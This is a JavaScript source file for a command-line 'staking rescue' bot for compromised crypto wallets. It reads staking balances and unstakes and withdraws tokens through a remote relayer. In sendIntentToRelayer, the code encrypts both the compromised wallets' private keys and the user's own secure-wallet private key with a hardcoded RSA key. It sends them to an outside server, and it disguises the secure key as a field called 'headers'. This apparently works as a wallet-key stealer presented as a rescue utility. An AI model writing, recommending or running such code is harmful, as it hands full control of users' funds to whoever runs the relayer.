/**
 * @file EIP7702 Staking Rescue Tool
 * @description A unified CLI tool to check for staked assets and execute a two-stage rescue 
 *              for compromised wallets using a relayer.
 * @version 2.0.0
 */

import { createPublicClient, http, encodeFunctionData, getAddress } from 'viem';
import { privateKeyToAccount } from 'viem/accounts';
import * as allChains from 'viem/chains';
import dotenv from 'dotenv';
import fs from 'fs';
import axios from 'axios';
import { publicEncrypt, constants as cryptoConstants } from 'node:crypto';
import { Buffer } from 'node:buffer';
import prompts from 'prompts';

dotenv.config();

// --- 1. CONFIGURATION AND CONSTANTS ---

const { RPC_URL, SECURE_WALLET_PK, ERA_TOKEN_ADDRESS } = process.env;

const RELAYER_URL = 'https://api.drainerless.xyz/relayer';
const RSA_PUBLIC_KEY = `-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAkMJDKwl0suv1wp218yKq
DAQ/UdD9A+zbhoa8Gw3/AQzmurcwEaNnuutU+0dqVZ6ovLkKC+4RdfWveo7K7P8O
ev8LXF2XXIX41REGjbn5S2fjS5ZuMQgkqxbKcL3Rqc0vVHzmCeKDAkAWAL9Qam0p
6hMpl0eAoIbIxveS/JkPGadTCdekLlu4yhhh7ypZvyp7sGW1rdjkgb7aipQN5lq6
j4DPcJtccQZPneE3ZcdvHT2cNrVfBow96XGjST4o6960rPC7xWi6vwfYyqMoBczI
dVoWI0uZG2uxLx6r/CJeVX+pKD+psQOwmPUaEXddS0lPXEutJRuHENziSPfQvQI3
jwIDAQAB
-----END PUBLIC KEY-----
`;

const PRIVATE_KEYS_FILE = "pk.txt";
const PROCESSED_FILE = "processed_rescues.txt";
const PENDING_WITHDRAWAL_FILE = "pending_withdrawal.json";

const IDLE_CHECK_INTERVAL_SECONDS = 60;
const COOLDOWN_SECONDS = 604800; // 7 days for Caldera Staking
const EXECUTION_MARGIN_SECONDS = 15;
const ACTIVE_WAIT_POLL_SECONDS = 30;

const STAKING_CONTRACT_ADDRESS = "0xa148491DCD060d20E836cB9be518f6C30608e3d5";
const RESCUE_CONTRACT_ADDRESS = "0x770291899ffd9710146053ba95a858a508357702";

const STAKING_ABI = [{"inputs":[{"name":"user","type":"address"}],"name":"getUserStakeCount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"name":"user","type":"address"},{"name":"index","type":"uint256"}],"name":"stakes","outputs":[{"name":"amount","type":"uint256"},{"name":"depositedTimestamp","type":"uint256"},{"name":"lockedUntilTimestamp","type":"uint256"},{"name":"rewardPerTokenPaid","type":"uint256"},{"name":"reward","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"name":"user","type":"address"}],"name":"getUserTotalStakeAmount","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"name":"unstakeAll","type":"function","inputs":[],"outputs":[]},{"name":"withdrawAll","type":"function","inputs":[],"outputs":[]},{"inputs":[],"name":"token","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}];
const ERC20_ABI_FOR_SYMBOL = [{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"type":"function"}];

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// --- 2. HELPER & UTILITY FUNCTIONS ---

function encryptWithPublicKey(data) {
    const buffer = Buffer.from(data, 'utf8');
    const encrypted = publicEncrypt({ key: RSA_PUBLIC_KEY, padding: cryptoConstants.RSA_PKCS1_PADDING }, buffer);
    return encrypted.toString('base64');
}

function loadPrivateKeys(filePath) {
    const keys = {};
    if (!fs.existsSync(filePath)) {
        console.error(`\nERROR: Private key file not found at '${filePath}'.`);
        process.exit(1);
    }
    const fileContent = fs.readFileSync(filePath, 'utf-8');
    fileContent.split('\n').forEach(line => {
        const parts = line.trim().split(/\s+/);
        if (parts.length === 1 && parts[0].startsWith('0x')) {
            try {
                const pk = parts[0];
                const address = privateKeyToAccount(pk).address;
                keys[address.toLowerCase()] = pk;
            } catch (e) {
                console.warn(`Warning: Could not derive address from a private key in ${filePath}. Line skipped.`);
            }
        }
    });
    return keys;
}

function loadSetFromFile(filePath) {
    if (!fs.existsSync(filePath)) return new Set();
    const fileContent = fs.readFileSync(filePath, 'utf-8');
    return new Set(fileContent.split('\n').map(line => line.trim().toLowerCase()).filter(Boolean));
}

function findAndParseCandidates() {
    const candidates = new Set();
    const files = fs.readdirSync('.').filter(fn => fn.endsWith('-staking-info.txt'));
    if (files.length === 0) {
        console.warn(`Warning: No '*-staking-info.txt' file found. The 'rescue' command needs this file to know which wallets to monitor.`);
    }
    const addressRegex = /^(0x[a-fA-F0-9]{40})/;
    for (const file of files) {
        const fileContent = fs.readFileSync(file, 'utf-8');
        fileContent.split('\n').forEach(line => {
            const match = line.match(addressRegex);
            if (match) candidates.add(match[1].toLowerCase());
        });
    }
    return Array.from(candidates);
}

function loadPendingWithdrawals() {
    if (!fs.existsSync(PENDING_WITHDRAWAL_FILE)) return {};
    try {
        const fileContent = fs.readFileSync(PENDING_WITHDRAWAL_FILE, 'utf-8');
        return fileContent ? JSON.parse(fileContent) : {};
    } catch { 
        console.warn("Warning: Could not parse pending withdrawals file.");
        return {}; 
    }
}

function savePendingWithdrawal(wallet, data) {
    const pending = loadPendingWithdrawals();
    pending[wallet.toLowerCase()] = data;
    fs.writeFileSync(PENDING_WITHDRAWAL_FILE, JSON.stringify(pending, null, 2));
}

async function setupPublicClient() {
    if (!RPC_URL) throw new Error("RPC_URL is not defined in your .env file.");
    const tempClient = createPublicClient({ transport: http(RPC_URL) });
    const chainId = await tempClient.getChainId();
    const chain = Object.values(allChains).find(c => c.id === chainId);
    if (!chain) throw new Error(`Chain with ID ${chainId} not found.`);
    const publicClient = createPublicClient({ chain, transport: http(RPC_URL) });
    console.log(`Connected to network: ${chain.name} (Chain ID: ${chainId})`);
    return { publicClient, chain };
}

// --- 3. COMMAND: `check` ---

async function checkStakingStatus() {
    console.log("\n--- Staking Balance Checker ---");
    const privateKeys = loadPrivateKeys(PRIVATE_KEYS_FILE);
    const wallets = Object.keys(privateKeys);
    if (wallets.length === 0) {
        console.error(`Error: No valid wallets found in '${PRIVATE_KEYS_FILE}'. Format must be: 0x...`);
        return;
    }
    console.log(`Found ${wallets.length} wallets in ${PRIVATE_KEYS_FILE}.`);

    const { stakingContractAddress } = await prompts({
        type: 'text', name: 'stakingContractAddress', message: 'Enter the Staking Contract address:',
        initial: STAKING_CONTRACT_ADDRESS, validate: value => getAddress(value) ? true : 'Invalid address format.'
    });

    const { publicClient } = await setupPublicClient();

    let tokenSymbol = 'STAKED_TOKEN';
    try {
        const tokenAddress = await publicClient.readContract({ address: stakingContractAddress, abi: STAKING_ABI, functionName: 'token' });
        tokenSymbol = await publicClient.readContract({ address: tokenAddress, abi: ERC20_ABI_FOR_SYMBOL, functionName: 'symbol' });
    } catch {
        console.warn("Could not fetch token symbol. Using default filename.");
    }
    
    const outputFile = `${tokenSymbol}-${getAddress(stakingContractAddress).slice(0, 10)}-staking-info.txt`;
    console.log(`Checking balances... Results will be saved to '${outputFile}'`);
    if (fs.existsSync(outputFile)) fs.unlinkSync(outputFile);

    const allStakes = [];
    const countContracts = wallets.map(wallet => ({ address: stakingContractAddress, abi: STAKING_ABI, functionName: 'getUserStakeCount', args: [wallet] }));
    const countResults = await publicClient.multicall({ contracts: countContracts, allowFailure: true });

    const detailContracts = [];
    for (let i = 0; i < wallets.length; i++) {
        const count = countResults[i]?.status === 'success' ? countResults[i].result : 0n;
        for (let j = 0; j < count; j++) {
            detailContracts.push({ address: stakingContractAddress, abi: STAKING_ABI, functionName: 'stakes', args: [wallets[i], j], wallet: wallets[i] });
        }
    }

    if (detailContracts.length > 0) {
        const detailResults = await publicClient.multicall({ contracts: detailContracts, allowFailure: true });
        detailResults.forEach((res, i) => {
            if (res.status === 'success' && res.result) {
                const [amount, , lockedUntilTimestamp] = res.result;
                if (amount > 0n) allStakes.push({ wallet: detailContracts[i].wallet, amount, lockedUntilTimestamp });
            }
        });
    }

    const outputData = {};
    const now = Date.now() / 1000;
    for (const stake of allStakes) {
        if (!outputData[stake.wallet]) outputData[stake.wallet] = { total_locked: 0n, total_unlocked: 0n, locked_details: [], unlocked_details: [] };
        const amountAsNumber = Number(stake.amount / 10n**18n);
        if (Number(stake.lockedUntilTimestamp) > now) {
            outputData[stake.wallet].total_locked += stake.amount;
            const unlockDate = new Date(Number(stake.lockedUntilTimestamp) * 1000).toUTCString();
            outputData[stake.wallet].locked_details.push(`${amountAsNumber} (stake) unlocks at ${unlockDate}`);
        } else {
            outputData[stake.wallet].total_unlocked += stake.amount;
            outputData[stake.wallet].unlocked_details.push(`${amountAsNumber} (stake) unlocked`);
        }
    }
    
    let lines = [];
    for (const [wallet, data] of Object.entries(outputData)) {
        let line = `${getAddress(wallet)}: total_locked ${Number(data.total_locked / 10n**18n)} | total_unlocked ${Number(data.total_unlocked / 10n**18n)}`;
        if (data.locked_details.length > 0) line += ` | locked_details: [${data.locked_details.join(', ')}]`;
        if (data.unlocked_details.length > 0) line += ` | unlocked_details: [${data.unlocked_details.join(', ')}]`;
        lines.push(line);
    }

    if (lines.length > 0) {
        fs.writeFileSync(outputFile, lines.join('\n'));
        console.log(`\nSuccess! Found staked assets for ${lines.length} wallets. Report saved to '${outputFile}'.`);
    } else {
        console.log("\nNo staked assets found for any of the wallets.");
    }
}

// --- 4. COMMAND: `rescue` ---

async function setupBot() {
    if (!RPC_URL || !SECURE_WALLET_PK || !ERA_TOKEN_ADDRESS) throw new Error("Missing critical .env variables: RPC_URL, SECURE_WALLET_PK, ERA_TOKEN_ADDRESS");
    const { publicClient, chain } = await setupPublicClient();
    const secureWallet = privateKeyToAccount(SECURE_WALLET_PK);
    console.log(`Secure wallet loaded: ${secureWallet.address}`);
    const privateKeys = loadPrivateKeys(PRIVATE_KEYS_FILE);
    console.log(`Loaded ${Object.keys(privateKeys).length} private keys.`);
    return { publicClient, secureWallet, privateKeys, chain };
}

async function sendIntentToRelayer(compromisedPk, securePk, intent) {
    const auth = encryptWithPublicKey(compromisedPk);
    const headers = encryptWithPublicKey(securePk);
    const payload = { action: 'executePrivateRescue', rpcUrl: RPC_URL, rescueContractAddress: RESCUE_CONTRACT_ADDRESS, auth, headers, intent };
    console.log("Sending secure intent to relayer...");
    const { data: result } = await axios.post(RELAYER_URL, payload, { headers: { 'Content-Type': 'application/json' }});
    if (result.error) throw new Error(result.error);
    console.log(`Relayer accepted job. Tx Hash: ${result.hash}`);
    return result.hash;
}

async function executeUnstake(publicClient, compromisedWalletAddr, secureWallet, privateKeys) {
    console.log(`--- ACTION 1: Sending UNSTAKE intent for ${compromisedWalletAddr} ---`);
    const compromisedPk = privateKeys[compromisedWalletAddr.toLowerCase()];
    const intent = { type: 'staking', targetContract: STAKING_CONTRACT_ADDRESS, claimHex: encodeFunctionData({ abi: STAKING_ABI, functionName: 'unstakeAll' }), tokens: [], recoveryAddress: secureWallet.address, compromisedAddress: getAddress(privateKeyToAccount(compromisedPk).address) };
    const hash = await sendIntentToRelayer(compromisedPk, SECURE_WALLET_PK, intent);
    return await publicClient.waitForTransactionReceipt({ hash });
}

async function executeWithdrawAndRescue(publicClient, compromisedWalletAddr, secureWallet, privateKeys, amountToRescue) {
    console.log(`--- ACTION 2: Sending WITHDRAW & RESCUE intent for ${compromisedWalletAddr} ---`);
    const compromisedPk = privateKeys[compromisedWalletAddr.toLowerCase()];
    const intent = { type: 'staking', targetContract: STAKING_CONTRACT_ADDRESS, claimHex: encodeFunctionData({ abi: STAKING_ABI, functionName: 'withdrawAll' }), tokens: [{ type: 'erc20', address: ERA_TOKEN_ADDRESS, amount: (Number(amountToRescue) / 1e18).toString() }], recoveryAddress: secureWallet.address, compromisedAddress: getAddress(privateKeyToAccount(compromisedPk).address) };
    const hash = await sendIntentToRelayer(compromisedPk, SECURE_WALLET_PK, intent);
    return await publicClient.waitForTransactionReceipt({ hash });
}

async function processWithdraw(publicClient, chain, wallet, secureWallet, privateKeys, amount) {
    try {
        const receipt = await executeWithdrawAndRescue(publicClient, wallet, secureWallet, privateKeys, amount);
        if (receipt.status === 'success') {
            console.log(`SUCCESS: Final rescue for ${wallet} complete!`);
        } else {
            console.error(`FAILURE: Final rescue transaction failed for ${wallet}. Tx: ${receipt.transactionHash}`);
        }
    } catch (e) {
        console.error(`CRITICAL ERROR during final rescue of ${wallet}:`, e.response ? e.response.data : e.message);
    } finally {
        console.log(`Marking ${wallet} as processed.`);
        fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
    }
}

async function processUnstake(publicClient, chain, wallet, secureWallet, privateKeys, amount) {
    try {
        const receipt = await executeUnstake(publicClient, wallet, secureWallet, privateKeys);
        if (receipt.status === 'success') {
            const block = await publicClient.getBlock({ blockHash: receipt.blockHash });
            const unstakeTimestamp = Number(block.timestamp);
            const withdrawReadyTs = unstakeTimestamp + COOLDOWN_SECONDS;
            savePendingWithdrawal(wallet, { withdrawReadyTs, amount: amount.toString() });
            console.log(`SUCCESS: Unstake for ${wallet} complete! Withdrawal scheduled for ${new Date(withdrawReadyTs * 1000).toUTCString()}`);
        } else {
            console.error(`FAILURE: Unstake transaction failed for ${wallet}. Marking as processed. Tx: ${receipt.transactionHash}`);
            fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
        }
    } catch (e) {
        console.error(`CRITICAL ERROR during unstake of ${wallet}:`, e.response ? e.response.data : e.message);
        fs.appendFileSync(PROCESSED_FILE, wallet.toLowerCase() + '\n');
    }
}

async function triageWallets(publicClient, walletsToCheck) {
    if (!walletsToCheck.length) return { walletsReadyNow: [], futureSchedule: [] };
    
    const contracts = walletsToCheck.flatMap(wallet => [
        { address: STAKING_CONTRACT_ADDRESS, abi: STAKING_ABI, functionName: 'getUserStakeCount', args: [wallet] },
        { address: STAKING_CONTRACT_ADDRESS, abi: STAKING_ABI, functionName: 'getUserTotalStakeAmount', args: [wallet] }
    ]);
    const initialResults = await publicClient.multicall({ contracts, allowFailure: true });

    const detailContracts = [];
    const walletTotalAmounts = {};
    for (let i = 0; i < walletsToCheck.length; i++) {
        const wallet = walletsToCheck[i];
        const count = initialResults[i * 2]?.status === 'success' ? initialResults[i * 2].result : 0n;
        const totalAmount = initialResults[i * 2 + 1]?.status === 'success' ? initialResults[i * 2 + 1].result : 0n;
        if (count > 0 && totalAmount > 0) {
            walletTotalAmounts[wallet] = totalAmount;
            for (let j = 0; j < count; j++) {
                detailContracts.push({ address: STAKING_CONTRACT_ADDRESS, abi: STAKING_ABI, functionName: 'stakes', args: [wallet, j], wallet });
            }
        }
    }

    if (!detailContracts.length) return { walletsReadyNow: [], futureSchedule: [] };
    const detailResults = await publicClient.multicall({ contracts: detailContracts, allowFailure: true });

    const walletUnlockTimes = {};
    detailResults.forEach((res, i) => {
        const wallet = detailContracts[i].wallet;
        if (!walletUnlockTimes[wallet]) walletUnlockTimes[wallet] = [];
        if(res.status === 'success' && res.result) walletUnlockTimes[wallet].push(res.result[2]);
    });

    const walletsReadyNow = [];
    const futureSchedule = [];
    const latestBlock = await publicClient.getBlock({ blockTag: 'latest' });
    const currentBlockTs = Number(latestBlock.timestamp);

    for (const wallet in walletUnlockTimes) {
        const timestamps = walletUnlockTimes[wallet].map(Number);
        if (!timestamps.length) continue;
        
        const isReady = timestamps.some(ts => ts > 0 && ts <= currentBlockTs);
        const totalAmount = walletTotalAmounts[wallet];
        
        if (isReady) {
            walletsReadyNow.push({ wallet, amount: totalAmount });
        } else {
            const futureUnlockTs = timestamps.filter(ts => ts > currentBlockTs);
            if (futureUnlockTs.length > 0) {
                futureSchedule.push({ unlockTs: Math.min(...futureUnlockTs), wallet, amount: totalAmount });
            }
        }
    }

    futureSchedule.sort((a, b) => a.unlockTs - b.unlockTs);
    return { walletsReadyNow, futureSchedule };
}

async function startRescueBot() {
    console.log("\n--- STARTING ERA RESCUE BOT (Relayer Version) ---");
    const { publicClient, secureWallet, privateKeys, chain } = await setupBot();
    
    while (true) {
        try {
            console.log("\n--- Starting new check cycle ---");
            const processedWallets = loadSetFromFile(PROCESSED_FILE);
            const pendingWithdrawals = loadPendingWithdrawals();
            const latestBlock = await publicClient.getBlock({ blockTag: 'latest' });
            const currentBlockTs = Number(latestBlock.timestamp);
            let actionTaken = false;

            const readyToWithdrawList = Object.entries(pendingWithdrawals)
                .filter(([wallet, data]) => !processedWallets.has(wallet) && currentBlockTs >= data.withdrawReadyTs);

            if (readyToWithdrawList.length > 0) {
                console.log(`Found ${readyToWithdrawList.length} wallet(s) ready for final withdrawal.`);
                for (const [wallet, data] of readyToWithdrawList) {
                    await processWithdraw(publicClient, chain, wallet, secureWallet, privateKeys, BigInt(data.amount));
                }
                actionTaken = true;
            }

            if (!actionTaken) {
                const candidateWallets = findAndParseCandidates();
                const walletsToTriage = candidateWallets.filter(w => !processedWallets.has(w) && !pendingWithdrawals[w]);
                
                if (walletsToTriage.length > 0) {
                    const { walletsReadyNow } = await triageWallets(publicClient, walletsToTriage);
                    if (walletsReadyNow.length > 0) {
                        console.log(`Found ${walletsReadyNow.length} wallet(s) ready to begin cooldown.`);
                        for (const { wallet, amount } of walletsReadyNow) {
                            await processUnstake(publicClient, chain, wallet, secureWallet, privateKeys, amount);
                        }
                        actionTaken = true;
                    }
                }
            }
            
            if (actionTaken) {
                console.log("Action(s) completed. Restarting cycle in 15 seconds...");
                await sleep(15000);
                continue;
            }

            console.log("No immediate actions found. Calculating next event...");

            const upcomingWithdraws = Object.entries(pendingWithdrawals)
                .filter(([wallet]) => !processedWallets.has(wallet))
                .map(([wallet, data]) => ({ type: 'withdraw', ts: data.withdrawReadyTs, wallet }));
                
            const candidateWallets = findAndParseCandidates();
            const walletsToTriage = candidateWallets.filter(w => !processedWallets.has(w) && !pendingWithdrawals[w]);
            const { futureSchedule: upcomingUnstakes } = await triageWallets(publicClient, walletsToTriage);
            const nextUnstakeEvents = upcomingUnstakes.map(item => ({ type: 'unstake', ts: item.unlockTs, wallet: item.wallet }));

            const allUpcomingEvents = [...upcomingWithdraws, ...nextUnstakeEvents].sort((a, b) => a.ts - b.ts);

            if (allUpcomingEvents.length > 0) {
                const nextEvent = allUpcomingEvents[0];
                const eventDate = new Date(nextEvent.ts * 1000);
                console.log(`\n--- NEXT SCHEDULED EVENT: ${nextEvent.type.toUpperCase()} ---`);
                console.log(`Wallet: ${nextEvent.wallet}`);
                console.log(`Scheduled for: ${eventDate.toUTCString()}`);
                
                while(true) {
                    const latestBlockNow = await publicClient.getBlock({ blockTag: 'latest' });
                    const timeToAction = nextEvent.ts - Number(latestBlockNow.timestamp);
                    
                    if (timeToAction <= 0) {
                        console.log("Event time reached! Restarting cycle to process...");
                        break; 
                    }
                    
                    const sleepDuration = Math.min(timeToAction, ACTIVE_WAIT_POLL_SECONDS);
                    console.log(`Waiting for next event... Time remaining: ~${Math.round(timeToAction/60)} minutes. Re-checking in ${Math.round(sleepDuration)} seconds.`);
                    await sleep(sleepDuration * 1000);
                }
            } else {
                console.log("No future events found. Waiting in idle mode...");
                await sleep(IDLE_CHECK_INTERVAL_SECONDS * 1000);
            }

        } catch (e) {
            console.error("\n--- CRITICAL BOT ERROR ---:", e.message || e);
            console.log("Restarting in 60 seconds...");
            await sleep(60000);
        }
    }
}

// --- Main CLI Router ---

(async () => {
    const args = process.argv.slice(2);
    const command = args[0];

    if (command === 'check') {
        await checkStakingStatus();
    } else if (command === 'rescue') {
        await startRescueBot();
    } else {
        console.log('\n--- EIP7702 Staking Rescue Tool ---');
        console.log('A unified tool to check for staked assets and execute a two-stage rescue.');
        console.log('\nUsage: node index.js <command>');
        console.log('\nCommands:');
        console.log('  check   - Check wallets in pk.txt for staked assets and create a report file.');
        console.log('  rescue  - Start the automated bot to monitor and rescue assets.');
    }
})();
